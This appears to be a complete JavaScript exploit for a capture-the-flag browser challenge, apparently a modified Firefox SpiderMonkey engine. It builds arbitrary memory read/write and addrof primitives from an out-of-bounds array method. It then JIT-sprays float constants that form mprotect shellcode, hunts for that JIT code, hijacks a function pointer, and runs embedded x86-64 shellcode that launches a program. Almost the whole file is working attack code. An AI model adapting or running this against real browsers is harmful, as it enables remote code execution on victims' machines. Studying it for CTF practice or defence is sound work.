// This file is generated by Python script
////////////////////////////////////////////////////////////////////////////////////////////////////
// util.js

// https://org.anize.rs/corCTF-2021/pwn/outfoxed
let __converter = new ArrayBuffer(8);
let __u64view = new BigUint64Array(__converter);
let __f64view = new Float64Array(__converter);

// Bit-cast an uint64_t to a float64
function itod(x) {
    __u64view[0] = x;
    return __f64view[0];
}

// Bit-cast a float64 to an uint64_t
function dtoi(x) {
    __f64view[0] = x;
    return __u64view[0];
}

function hex(x) {
    if (x < 0) {
        return '-' + hex(-x);
    }
    return '0x' + x.toString(16).padStart(16, '0');
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

// Call the GC - Phoenhex function
function gc() {
	let __maxMallocBytes=128*1024*1024; // 128m
	for (var __i = 0; __i < 100; __i++) {
		var __gc_tmp = new ArrayBuffer(__maxMallocBytes); // Allocate locally, but don't save
	}
}

function log(msg) {
    // TODO: Add a HTML log output as well
    console.log(msg);
}

function dump(obj) {
    try {
        dumpObject(obj);
    } catch (e) {
        // nop
    }
}

function egghunt(start, max, egg1, egg2) {
    log(`Searching from ${hex(start)} to ${hex(max)}`);
    // Convert the egg once, so it doesn't end up on the heap 4999 times
    let dEgg0 = dtoi(egg1);
    let dEgg1 = dtoi(egg2);
    for (let i = start; i < max - 8n; i+=1n) {
        var tmp = r64(i);
        if (tmp == dEgg0) {
            tmp = r64(i + 8n)
            if (tmp == dEgg1) {
                return i;
            }
        }
    }
    return -1;
}
////////////////////////////////////////////////////////////////////////////////////////////////////
// exploit.js


////////////////////////////////////////////////////////////////////////////////
// Step 1: Get arb RW
function w64(addr, val) {
    // Found this offset by just dumping some pointers OOB,
    // and looking for 0x4141414141414141 in gdb.
    //
    // redefining x/y each time avoids GC bullshittery
    let x = new Array(1.1, 2.2)
    let y = new BigInt64Array(1);
    // y[0] = 0x4141414141414141n;
    x.oob(9, itod(addr));
    y[0] = val;
}

function r64(addr) {
    let x = new Array(1.1, 2.2)
    let y = new BigInt64Array(1);
    x.oob(9, itod(addr));
    return y[0];
}

function addrof(obj) {
    let x = new Array(1.1, 2.2)
    let y = new BigInt64Array(1);
    x.oob(10, obj);
    return y[0] & 0xffffffffffffn;
}

////////////////////////////////////////////////////////////////////////////////
// Step 2: stage some shellcode
var shellcode = [
   0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x50, 0x48, 0xb8, 0x2e, 0x79, 0x62, 0x60, 0x6d, 0x62, 0x01, 0x01, 0x48, 0x31, 0x04, 0x24, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x3b, 0x31, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x31, 0xd2, 0x52, 0x6a, 0x08, 0x5a, 0x48, 0x01, 0xe2, 0x52, 0x48, 0x89, 0xe2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05 
];

var page = new Uint8Array(0x1000);
var pPage = addrof(page);
log("page @ " + hex(pPage));
var pBackingPage = pPage + 0x30n;
var backingPage = r64(pBackingPage);
log(`BackingPage: ${hex(pBackingPage)} -> ${hex(backingPage)}`);


// JIT spray some constants to make up mprotect(x, 0x1000, 7) shellcode
const jitme = (x) => [8.441747321662288e-149, 8.930537139822224e-149, 1.3479969217055813e-231, -5.877471923286753e-39, -6.272466154045844e-228, ];
const egg1 = jitme(1.1)[0];
const egg2 = jitme(1.1)[1];

for (let i = 0; i < 100000; i++) {
    jitme(1.1);
}

var pJitMe = addrof(jitme);
console.log("jitme: " + hex(pJitMe));

var pppCode = pJitMe + 0x28n;
var ppCode = r64(pppCode);
var pCode = r64(ppCode);
log(`Code: ${hex(pppCode)} -> ${hex(ppCode)} -> ${hex(pCode)}`);

var start = pCode;
start = start & 0xfffffffffffff000n;
var pJitCode = egghunt(start, start + 0x5000n, egg1, egg2);
if (pJitCode == -1) {
    log("Failed to find JIT code");
} else {
    pJitCode = pJitCode + 0x10n;
    log(`JITCode: ${hex(pJitCode)}`);
    // Move the function pointer to the JIT'ed mprotect shellcode
    w64(ppCode, pJitCode);

    // mprotect the backingPage
    jitme(itod(backingPage));

    // Copy the shellcode to the backing page
    for (var i = 0; i < shellcode.length; i++) {
        page[i] = shellcode[i];
    }

    // Trigger the shellcode
    w64(ppCode, backingPage)

    jitme(itod(0x1122334455667788n));
}
